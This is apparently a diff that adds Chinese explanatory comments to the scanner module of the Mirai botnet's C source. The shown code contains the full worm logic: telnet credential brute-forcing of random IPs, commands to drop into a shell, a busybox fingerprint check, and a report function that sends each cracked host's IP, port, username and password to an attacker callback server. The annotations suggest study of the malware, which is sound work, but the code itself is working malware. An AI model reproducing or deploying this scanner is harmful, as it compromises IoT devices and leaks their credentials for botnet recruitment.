@@ -197,7 +197,7 @@ void scanner_init(void)
 #endif
 
     // Main logic loop
-    while (TRUE)
+    while (TRUE)            //如果在登录后，没有成功得到shell的，会在这里重新进入新的一层循环，接下来会判断是不是timeout
     {
         fd_set fdset_rd, fdset_wr;
         struct scanner_connection *conn;
@@ -324,14 +324,14 @@ void scanner_init(void)
                 // Retry
                 if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                 {
-                    if (++(conn->tries) == 10)  //如果尝试了10次，还是没成功，就重置废弃这个连接
+                    if (++(conn->tries) == 10)  //如果尝试了10次，还是没成功，就重置废弃这个连接【之后200行位置的下一层循环会重新用新的ip建立连接】
                     {
                         conn->tries = 0;
                         conn->state = SC_CLOSED;
                     }
                     else
                     {
-                        setup_connection(conn);     //如果超时，但是之前成功回显过username-passwd，那么现在重新尝试连接。
+                        setup_connection(conn);     //如果超时，但是之前成功回显过username-passwd，那么现在重新尝试连接。【也许之前尝试的用户名和密码不对】
 #ifdef DEBUG
                         printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
 #endif
@@ -346,7 +346,8 @@ void scanner_init(void)
             }
             //select()机制中提供一fd_set的数据结构，实际上是一long类型的数组，每一个数组元素都能与一打开的文件句柄（不管是socket句柄，还是其他文件或命名管道或设备句柄）建立联系，
             //建立联系的工作由程序员完成，当调用select()时，由内核根据IO状态修改fd_set的内容，由此来通知执行了select()的进程哪一socket或文件发生了可读或可写事件。
-            //根据state，加入不同的set集合【读/写】
+            //根据state，加入不同的set集合【可读/可写】
+            //注意: 当刚刚到达连接状态的时候，会放入到fdset_wr集合。如果不是connecting状态且非closed的其他状态的话都放入fdset_rd
             if (conn->state == SC_CONNECTING)  
             {
                 FD_SET(conn->fd, &fdset_wr);  /*将fd加入set集合fdset_wr，之后调用select进行对所有telnet connection进行监听*/
@@ -380,7 +381,7 @@ void scanner_init(void)
             if (conn->fd == -1)
                 continue;
 
-            if (FD_ISSET(conn->fd, &fdset_wr)) /* 测试conn->fd是否包含在集合fdset_wr中，也就是说这个文件描述符conn->fd需要写入 */ 
+            if (FD_ISSET(conn->fd, &fdset_wr)) /* 测试conn->fd是否包含在集合fdset_wr中，也就是说这个文件描述符conn->fd可以写入【只要有conntecion状态的fd才会在fdset_wr中】 */ 
             {
                 int err = 0, ret = 0;
                 socklen_t err_len = sizeof (err);
@@ -389,7 +390,7 @@ void scanner_init(void)
                 if (err == 0 && ret == 0)  //如果套接字上没有发生错误
                 {
                     conn->state = SC_HANDLE_IACS;
-                    conn->auth = random_auth_entry();   //随机获取一个登录用户名+密码尝试
+                    conn->auth = random_auth_entry();   //随机获取一个登录用户名+密码尝试【可能是二次尝试登录】
                     conn->rdbuf_pos = 0;
 #ifdef DEBUG
                     printf("[scanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
@@ -408,7 +409,7 @@ void scanner_init(void)
                 }
             }
 
-            if (FD_ISSET(conn->fd, &fdset_rd))  /* 测试conn->fd是否包含在集合fdset_wr中，也就是说这个文件描述符conn->fd需要读取 */ 
+            if (FD_ISSET(conn->fd, &fdset_rd))  /* 测试conn->fd是否包含在集合fdset_rd中，也就是说这个文件描述符conn->fd可以读取*/ 
             {
                 while (TRUE)
                 {
@@ -417,12 +418,18 @@ void scanner_init(void)
                     if (conn->state == SC_CLOSED)
                         break;
 
-                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
+                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)  //溢出了，那么就覆盖64位的旧数据
                     {
                         memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                         conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                     }
                     errno = 0;
+                    //recv【rdbuf_pos是缓冲区末尾字符的下标】
+                    //此时处于SC_HANDLE_IACS截断，要进行协议的选项协商->使用IAC
+                    //https://www.omnisecu.com/tcpip/iac-interpret-as-command-telnet.php
+                    //https://tools.ietf.org/html/rfc854
+                    //https://stackoverflow.com/questions/10413963/telnet-iac-command-answering
+                    //https://www.cnblogs.com/liang-ling/p/5833489.html
                     ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);   //接收尽可能多的字符【还剩下的缓冲区大小SCANNER_RDBUF_SIZE - conn->rdbuf_pos】
                     if (ret == 0)
                     {
@@ -465,62 +472,62 @@ void scanner_init(void)
                     {
                         int consumed = 0;
 
-                        switch (conn->state)    
+                        switch (conn->state)
                         {
                         case SC_HANDLE_IACS:
-                            if ((consumed = consume_iacs(conn)) > 0)
+                            if ((consumed = consume_iacs(conn)) > 0)    //NVT IAC 协商
                             {
-                                conn->state = SC_WAITING_USERNAME;
+                                conn->state = SC_WAITING_USERNAME;  //转成等待输入用户名状态
 #ifdef DEBUG
                                 printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
 #endif
                             }
                             break;
-                        case SC_WAITING_USERNAME:
+                        case SC_WAITING_USERNAME:       //当前到达等待“<主机名> login:”的状态
                             if ((consumed = consume_user_prompt(conn)) > 0)
                             {
-                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
-                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
-                                conn->state = SC_WAITING_PASSWORD;
+                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);   //发送用户名
+                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);    // 发送\n
+                                conn->state = SC_WAITING_PASSWORD;  //进入输入密码模式
 #ifdef DEBUG
                                 printf("[scanner] FD%d received username prompt\n", conn->fd);
 #endif
                             }
                             break;
-                        case SC_WAITING_PASSWORD:
-                            if ((consumed = consume_pass_prompt(conn)) > 0)
+                        case SC_WAITING_PASSWORD:       //当前到达等待“Password:”的状态
+                            if ((consumed = consume_pass_prompt(conn)) > 0)     //查找登录提示符
                             {
 #ifdef DEBUG
                                 printf("[scanner] FD%d received password prompt\n", conn->fd);
 #endif
 
                                 // Send password
-                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
+                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);   //发送密码
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
 
                                 conn->state = SC_WAITING_PASSWD_RESP;
                             }
                             break;
-                        case SC_WAITING_PASSWD_RESP:
-                            if ((consumed = consume_any_prompt(conn)) > 0)
+                        case SC_WAITING_PASSWD_RESP:   
+                            if ((consumed = consume_any_prompt(conn)) > 0)  //如果找到了shell提示符说明尝试登录成功。
                             {
                                 char *tmp_str;
                                 int tmp_len;
 
 #ifdef DEBUG
-                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
+                                printf("[scanner] FD%d received shell prompt\n", conn->fd); 
 #endif
 
-                                // Send enable / system / shell / sh to session to drop into shell if needed
+                                // Send enable / system / shell / sh to session to drop into shell if needed【如果登录成功，尝试使用几个命令进入shell】
                                 table_unlock_val(TABLE_SCAN_ENABLE);
                                 tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
-                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);     //发送“enable”命令【显示所有激活的内部命令】
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                 table_lock_val(TABLE_SCAN_ENABLE);
                                 conn->state = SC_WAITING_ENABLE_RESP;
                             }
                             break;
-                        case SC_WAITING_ENABLE_RESP:
+                        case SC_WAITING_ENABLE_RESP:    //等待enable命令返回
                             if ((consumed = consume_any_prompt(conn)) > 0)
                             {
                                 char *tmp_str;
@@ -530,17 +537,17 @@ void scanner_init(void)
                                 printf("[scanner] FD%d received sh prompt\n", conn->fd);
 #endif
 
-                                table_unlock_val(TABLE_SCAN_SYSTEM);
+                                table_unlock_val(TABLE_SCAN_SYSTEM);        //解密得到“system”字符串
                                 tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
-                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);     //发送“system”命令
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                 table_lock_val(TABLE_SCAN_SYSTEM);
 
-                                conn->state = SC_WAITING_SYSTEM_RESP;
+                                conn->state = SC_WAITING_SYSTEM_RESP;  
                             }
                             break;
 			case SC_WAITING_SYSTEM_RESP:
-                            if ((consumed = consume_any_prompt(conn)) > 0)
+                            if ((consumed = consume_any_prompt(conn)) > 0)     
                             {
                                 char *tmp_str;
                                 int tmp_len;
@@ -550,12 +557,12 @@ void scanner_init(void)
 #endif
 
                                 table_unlock_val(TABLE_SCAN_SHELL);
-                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
+                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);    //解密发送"shell"命令
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                 table_lock_val(TABLE_SCAN_SHELL);
 
-                                conn->state = SC_WAITING_SHELL_RESP;
+                                conn->state = SC_WAITING_SHELL_RESP;    
                             }
                             break;
                         case SC_WAITING_SHELL_RESP:
@@ -569,7 +576,7 @@ void scanner_init(void)
 #endif
 
                                 table_unlock_val(TABLE_SCAN_SH);
-                                tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);
+                                tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);      //解密发送"sh"命令
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                 table_lock_val(TABLE_SCAN_SH);
@@ -578,7 +585,7 @@ void scanner_init(void)
                             }
                             break;
                         case SC_WAITING_SH_RESP:
-                            if ((consumed = consume_any_prompt(conn)) > 0)
+                            if ((consumed = consume_any_prompt(conn)) > 0)          
                             {
                                 char *tmp_str;
                                 int tmp_len;
@@ -588,8 +595,8 @@ void scanner_init(void)
 #endif
 
                                 // Send query string
-                                table_unlock_val(TABLE_SCAN_QUERY);
-                                tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);
+                                table_unlock_val(TABLE_SCAN_QUERY);         //解密发送"/bin/busybox MIRAI"命令【估计是被MIRAI定制的sh等或是攻击程序】
+                                tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);   //安装了busybox极大可能就是IOT设备了
                                 send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                 table_lock_val(TABLE_SCAN_QUERY);
@@ -597,14 +604,17 @@ void scanner_init(void)
                                 conn->state = SC_WAITING_TOKEN_RESP;
                             }
                             break;
+                        //之前的命令尝试就算无效。也会有新的命令提示符出现。
+                        //因此如果登录成功前面几个case的consume_any_prompt(conn)一定都是>0，因此一定会达到这个case
+                        //
                         case SC_WAITING_TOKEN_RESP:
-                            consumed = consume_resp_prompt(conn);
-                            if (consumed == -1)
+                            consumed = consume_resp_prompt(conn);           //查找回显的字符串中是否有"MIRAI: applet not found"
+                            if (consumed == -1)     //如果返回-1，则说明找到"ncorrect"。说明之前的登录没有成功【telnet提示Login incorrect】
                             {
 #ifdef DEBUG
                                 printf("[scanner] FD%d invalid username/password combo\n", conn->fd);
 #endif
-                                close(conn->fd);
+                                close(conn->fd);    //关闭连接
                                 conn->fd = -1;
 
                                 // Retry
@@ -615,20 +625,20 @@ void scanner_init(void)
                                 }
                                 else
                                 {
-                                    setup_connection(conn);
+                                    setup_connection(conn); //尝试重新连接，回到connecting状态【不会再进入任何case，会在653行直接break上层的循环，一直回退，直到又可以重新尝试新的用户名和密码】
 #ifdef DEBUG
                                     printf("[scanner] FD%d retrying with different auth combo!\n", conn->fd);
 #endif
                                 }
                             }
-                            else if (consumed > 0)
+                            else if (consumed > 0)  //如果有"MIRAI: applet not found"，那么说明连接+登录成功了
                             {
                                 char *tmp_str;
                                 int tmp_len;
 #ifdef DEBUG
                                 printf("[scanner] FD%d Found verified working telnet\n", conn->fd);
 #endif
-                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
+                                report_working(conn->dst_addr, conn->dst_port, conn->auth); //报告登录主机的信息到attacker的服务器下【！！】
                                 close(conn->fd);
                                 conn->fd = -1;
                                 conn->state = SC_CLOSED;
@@ -640,15 +650,15 @@ void scanner_init(void)
                         }
 
                         // If no data was consumed, move on
-                        if (consumed == 0)
+                        if (consumed == 0)  //如果没有consumed的了。就break。不然不断继续状态的转移。
                             break;
                         else
                         {
                             if (consumed > conn->rdbuf_pos)
                                 consumed = conn->rdbuf_pos;
 
-                            conn->rdbuf_pos -= consumed;
-                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
+                            conn->rdbuf_pos -= consumed;    //之前的处理，消耗了consumed个字符，现在则更新conn->rdbuf_pos。
+                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);  //处理过的字符就会移除掉，更新缓存内容【因为可能有重叠的情况，因此需要用memmove而不是memcpy】
                         }
                     }
                 }
@@ -722,69 +732,71 @@ static ipv4_t get_random_ip(void)
 
     return INET_ADDR(o1,o2,o3,o4);
 }
-
+//	victim希望attacker激活某选项【除了允许协商返回windows size】，其他一律拒绝
+//  victim想激活某选项，attacker均接收该选项请求
 static int consume_iacs(struct scanner_connection *conn)
-{
+{//参考：telnet IAC=>https://stackoverflow.com/questions/10413963/telnet-iac-command-answering
+//http://www.tsnien.idv.tw/Internet_WebBook/chap11/11-4%20Telnet%20%E9%80%9A%E8%A8%8A%E5%8D%94%E5%AE%9A.html
     int consumed = 0;
     uint8_t *ptr = conn->rdbuf;
 
     while (consumed < conn->rdbuf_pos)
     {
-        int i;
+        int i;   //消耗“读取缓冲区“中的数据
 
         if (*ptr != 0xff)
             break;
-        else if (*ptr == 0xff)
+        else if (*ptr == 0xff)  //IAC
         {
             if (!can_consume(conn, ptr, 1))
                 break;
-            if (ptr[1] == 0xff)
+            if (ptr[1] == 0xff)  //读取到0xff ff继续下一轮读取
             {
                 ptr += 2;
                 consumed += 2;
                 continue;
             }
-            else if (ptr[1] == 0xfd)
+            else if (ptr[1] == 0xfd) //读取到0xff fd 【DO】 如果victim愿意
             {
-                uint8_t tmp1[3] = {255, 251, 31};
-                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
+                uint8_t tmp1[3] = {255, 251, 31};   //255 251 31   IAC WILL NAWS
+                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};   //IAC SB NAWS 80 24 IAC SE【给出终端窗口大小为width*height=80*24】
 
                 if (!can_consume(conn, ptr, 2))
                     break;
-                if (ptr[2] != 31)
+                if (ptr[2] != 31)   //如果下一个字符不是0x1f
                     goto iac_wont;
 
-                ptr += 3;
+                ptr += 3;           //读取到0xff fd 1f【IAC DO NAWS】=>协商窗口大小
                 consumed += 3;
 
-                send(conn->fd, tmp1, 3, MSG_NOSIGNAL);
+                send(conn->fd, tmp1, 3, MSG_NOSIGNAL); //通过conn->fd发送tmp1、tmp2数据回去。
                 send(conn->fd, tmp2, 9, MSG_NOSIGNAL);
             }
             else
             {
-                iac_wont:
+                iac_wont:   
 
-                if (!can_consume(conn, ptr, 2))
+                if (!can_consume(conn, ptr, 2))  //一律回答WONT
                     break;
 
-                for (i = 0; i < 3; i++)
+                for (i = 0; i < 3; i++) //遍历前三个字符，把0xfd替换为0xfc，把0xfb替换为0xfd
                 {
-                    if (ptr[i] == 0xfd)
-                        ptr[i] = 0xfc;
-                    else if (ptr[i] == 0xfb)
-                        ptr[i] = 0xfd;
+                    if (ptr[i] == 0xfd)         //DO
+                        ptr[i] = 0xfc;          // WONT
+                    else if (ptr[i] == 0xfb)   //WILL
+                        ptr[i] = 0xfd;      //DO
                 }
 
-                send(conn->fd, ptr, 3, MSG_NOSIGNAL);
+                send(conn->fd, ptr, 3, MSG_NOSIGNAL);   //发送ptr字符串的前三个字节
                 ptr += 3;
                 consumed += 3;
             }
         }
     }
 
-    return consumed;
+    return consumed;    // 返回rdbuf消耗到哪里了，返回还未读取的字符的下标
 }
-
+//查找shell提示符
 static int consume_any_prompt(struct scanner_connection *conn)
 {
     char *pch;
@@ -802,7 +814,7 @@ static int consume_any_prompt(struct scanner_connection *conn)
     if (prompt_ending == -1)
         return 0;
     else
-        return prompt_ending;
+        return prompt_ending;   //返回处理到的提示符的下一个字符【也就是prompt_ending】
 }
 
 static int consume_user_prompt(struct scanner_connection *conn)
@@ -810,7 +822,7 @@ static int consume_user_prompt(struct scanner_connection *conn)
     char *pch;
     int i, prompt_ending = -1;
 
-    for (i = conn->rdbuf_pos - 1; i > 0; i--)
+    for (i = conn->rdbuf_pos - 1; i > 0; i--)   //conn->rdbuf_pos指向下一个缓冲区空位置，因此conn->rdbuf_pos-1为接收到的最后一个字符，现在查找提示符
     {
         if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
         {
@@ -819,22 +831,23 @@ static int consume_user_prompt(struct scanner_connection *conn)
         }
     }
 
-    if (prompt_ending == -1)
+    if (prompt_ending == -1)    //没有找到登录提示符
     {
         int tmp;
 
-        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)
+        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "ogin", 4)) != -1)  //返回找到ogin的下一个conn->rdbuf的index
             prompt_ending = tmp;
         else if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, "enter", 5)) != -1)
             prompt_ending = tmp;
     }
 
-    if (prompt_ending == -1)
+    if (prompt_ending == -1)    //没有找到于登录相关的提示符
         return 0;
     else
-        return prompt_ending;
+        return prompt_ending; //找到了登录相关的提示，返回相关字符的下一个conn->rdbuf的index
 }
 
+//判断是不是密码输入提示
 static int consume_pass_prompt(struct scanner_connection *conn)
 {
     char *pch;
@@ -868,18 +881,18 @@ static int consume_resp_prompt(struct scanner_connection *conn)
     char *tkn_resp;
     int prompt_ending, len;
 
-    table_unlock_val(TABLE_SCAN_NCORRECT);
-    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
-    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
+    table_unlock_val(TABLE_SCAN_NCORRECT);      //ncorrect
+    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);   
+    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)  //查找收到的数据中是否有“ncorrect”字段
     {
         table_lock_val(TABLE_SCAN_NCORRECT);
-        return -1;
+        return -1;                                          //如果找到ncorrect就返回-1
     }
     table_lock_val(TABLE_SCAN_NCORRECT);
 
-    table_unlock_val(TABLE_SCAN_RESP);
+    table_unlock_val(TABLE_SCAN_RESP);                       //MIRAI: applet not found【如果/bin/busybox找不到这个MIRAI命令就会回显“MIRAI: applet not found”】
     tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
-    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
+    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);    //说明大概率是个装了busybox的设备
     table_lock_val(TABLE_SCAN_RESP);
 
     if (prompt_ending == -1)
@@ -936,10 +949,10 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
         exit(0);
     }
 
-    table_unlock_val(TABLE_SCAN_CB_DOMAIN);
-    table_unlock_val(TABLE_SCAN_CB_PORT);
+    table_unlock_val(TABLE_SCAN_CB_DOMAIN);         //report.changeme.com
+    table_unlock_val(TABLE_SCAN_CB_PORT);              //port为0xBB E5=48101
 
-    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));
+    entries = resolv_lookup(table_retrieve_val(TABLE_SCAN_CB_DOMAIN, NULL));    //解析report.changeme.com，得到对应的ip地址
     if (entries == NULL)
     {
 #ifdef DEBUG
@@ -948,14 +961,14 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
         return;
     }
     addr.sin_family = AF_INET;
-    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+    addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];    //随便选一个可用的ip
     addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
     resolv_entries_free(entries);
 
     table_lock_val(TABLE_SCAN_CB_DOMAIN);
     table_lock_val(TABLE_SCAN_CB_PORT);
 
-    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)   //向attacker持有的远程report服务器发起connect，报告现在可以登录的主机
     {
 #ifdef DEBUG
         printf("[report] Failed to connect to scanner callback!\n");
@@ -964,8 +977,8 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
         exit(0);
     }
 
-    uint8_t zero = 0;
-    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
+    uint8_t zero = 0;   //感觉这是一个传输“可登录主机”的标识符
+    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);            //传输可登录的主机的ip、端口、用户名和密码
     send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
     send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
     send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
@@ -1001,7 +1014,7 @@ static char *deobf(char *str, int *len)
 
     return cpy;
 }
-
+ //判断能否从conn->rdbuf中读取amount长度的字符数据
 static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
 {
     uint8_t *end = conn->rdbuf + conn->rdbuf_pos;
